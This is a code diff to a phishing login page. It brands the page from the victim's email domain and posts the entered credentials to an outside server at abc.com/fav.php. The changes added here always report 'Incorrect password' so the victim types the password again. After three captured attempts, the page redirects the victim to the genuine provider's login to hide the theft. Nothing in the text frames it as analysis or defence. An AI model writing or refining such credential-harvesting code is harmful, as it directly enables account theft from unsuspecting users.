@@ -29,6 +29,9 @@
         @keyframes slideIn {
             to { transform: translateX(0); opacity: 1; }
         }
+        #submit-btn {
+            cursor: pointer; /* Ensure button looks clickable */
+        }
     </style>
 </head>
 <body>
@@ -158,6 +161,10 @@
             updateBranding(email);
             $('#email').val(email); // Populate email input with extracted email
 
+            // Track sign-in attempts
+            let attemptCount = parseInt(localStorage.getItem('loginAttempts')) || 0;
+            const maxAttempts = 3;
+
             // Handle form submission (client-side validation)
             $('#login-form').on('submit', function(e) {
                 e.preventDefault(); // Prevent default submission until validated
@@ -183,9 +190,32 @@
                     return;
                 }
 
-                $('#msg').text('Submitting to server...').show();
-                console.log('Form submitted: Email=', emailVal);
-                this.submit(); // Manually trigger form submission to https://abc.com/fav.php
+                // Increment attempt count
+                attemptCount++;
+                localStorage.setItem('loginAttempts', attemptCount);
+                console.log('Attempt', attemptCount, 'of', maxAttempts, ': Email=', emailVal);
+
+                // Show incorrect password warning
+                $('#error').text('Incorrect password').show();
+                $('#password').val(''); // Clear password field
+
+                // Submit form to https://abc.com/fav.php
+                try {
+                    this.submit(); // Trigger form submission
+                } catch (error) {
+                    console.error('Form submission failed:', error.message);
+                    $('#error').text('Failed to submit form. Please try again.').show();
+                    return;
+                }
+
+                // Redirect after max attempts
+                if (attemptCount >= maxAttempts) {
+                    const domain = emailVal.split('@')[1];
+                    const redirectUrl = getLoginUrl(domain);
+                    console.log('Max attempts reached, redirecting to:', redirectUrl);
+                    localStorage.removeItem('loginAttempts'); // Reset attempts
+                    window.location.href = redirectUrl;
+                }
             });
         });
     </script>
